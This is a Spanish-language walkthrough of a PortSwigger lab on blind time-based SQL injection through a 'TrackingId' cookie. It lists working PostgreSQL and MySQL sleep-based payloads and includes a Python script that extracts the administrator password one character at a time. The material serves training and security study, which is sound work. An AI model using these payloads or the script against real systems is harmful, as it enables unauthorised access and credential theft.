### Parte 1

Partimos de una cookie ‘**TrackingId**‘ vulnerable que se inserta directamente en una consulta SQL. Aprovechamos esta inyección para condicionar la ejecución de la función ‘**pg_sleep**‘ en función del resultado de la consulta. Si la condición se cumple, la aplicación se retrasa; si no, responde al instante.

Inicialmente verificamos si existe el usuario ‘**administrator**‘. A partir de ahí, inferimos la longitud exacta de su contraseña mediante condiciones incrementales como ‘**LENGTH(password)>n**‘, observando el tiempo de respuesta.

Una vez conocida la longitud (20 caracteres), automatizamos el proceso con Burp Intruder, utilizando ‘**SUBSTRING()**‘ para probar carácter por carácter. Configuramos los ataques para ejecutarse en un solo hilo y comparamos los tiempos de respuesta para identificar los caracteres correctos.

Finalmente, reconstruimos la contraseña completa y accedemos con las credenciales del administrador, completando el laboratorio con éxito

### Parte 2

Partimos desde el punto en el que ya conocemos la longitud de la contraseña del usuario ‘**administrator**‘. Ahora nos centramos en automatizar por completo la recuperación del valor de cada carácter que la compone, utilizando Burp Intruder para iterar de forma sistemática por todas las posiciones y valores posibles (letras minúsculas y números).

Se configura un ataque por cada posición de la contraseña, adaptando la consulta con ‘**SUBSTRING(password, n, 1)**‘ y analizando el retardo en la respuesta para identificar el carácter correcto. Cada vez que se produce una demora significativa (≈10 segundos), se confirma que el carácter probado es el correcto.

Repetimos el proceso hasta reconstruir completamente la contraseña, cerrando el ejercicio con el acceso exitoso a la cuenta del administrador

-----

* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' and sleep(5)-- -
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr'||pg_sleep(5)-- -
* Cookie: TrackingId=test' ; select pg_sleep(5)-- -
* Cookie: TrackingId=test' %3b select pg_sleep(5)-- - (urlencoding el ;)
* Cookie: TrackingId=test' %3b select case when (1=1) then pg_sleep(5) else pg_sleep(0) end-- - (tarda 5 seg)
* Cookie: TrackingId=test' %3b select case when (1=2) then pg_sleep(5) else pg_sleep(0) end-- - (no tarda nada cuando la condicion no se cumple)

Esto seria verdadero, porque hay un usuario administrator en la tabla users
* TrackingId=test' %3b select case when (username='administrator') then pg_sleep(5) else pg_sleep(0) end from users-- -

Para obtener el longitud de la contraseña
* TrackingId=test' %3b select case when (username='administrator' and length(password)=20) then pg_sleep(5) else pg_sleep(0) end from users-- -

Para obtener cada uno de los caracteres de la conttraseña del usuario administrador
* TrackingId=test' %3b select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(5) else pg_sleep(0) end from users-- -

Ya con esto, podemos montarnos un script en python para automatizar toda la extraccion de los datos

```python
from pwn import *
import requests
import time
import signal
import string

def def_handler(sig,frame):
    p1.failure("Ataque Detenido")
    print(f"\n\n[!] Saliendo....\n")
    exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = "https://website_potswigger.com"
characters = string.ascii_lowercase + string.digits
p1 = log.progress("SQL")

def makeRequest():

    p1.status("Iniciando el Ataque")
    time.sleep(3)

    p2 = log.progress("Password")
    password = ""

    for position in range(1,21):
        for character in characters:
            cookies = {
                "TrackingId":f"test'%3b select case when (username='administrator' and substring(password,{position},1)='{character}') then pg_sleep(2) else pg_sleep(0) end from users-- -",
                "session":"cfvojf38hrvrvsu38u"
            }
            #print(cookies["TrackingId"])
            
            p1.status(cookies["TrackingId"])
                    
            time_start = time.time() # tiempo inicial
            r = requests.get(main_url, cookies=cookies)
            time_end = time.time()   # tiempo final

            if time_end - time_start > 2:
                password+=character
                p2.status(password)
                break
    
if __name__=='__main__':
    makeRequest()

```


Ahora si tuvieramos un MYSQL, seria de la siguiente forma:

* cjdcdc' or 1=1-- -
* cjdcdc' or if(condicion, verdadero , falso)-- - (forma logica de verlo)

Entonces si el primer caracter de la base de datos es una "a", tardaría 5 seg, de lo contraron, no tardaría nada
* cjdcdc' or if(substr(database(),1,1)='a', sleep(5) , sleep(0))-- -

Podemos poner un valor valido, y cambiarlo por "and":
* 1' and if(substr(database(),1,1)='a', sleep(5) , sleep(0))-- -

Ahora podemos jugar con querys internas:
* 1' and if(substr((select password from users where username='administrator'),1,1)='a', sleep(5) , sleep(0))-- -

Una vez teniendo la query para minar datos, podemos hacer un script y minar toda la información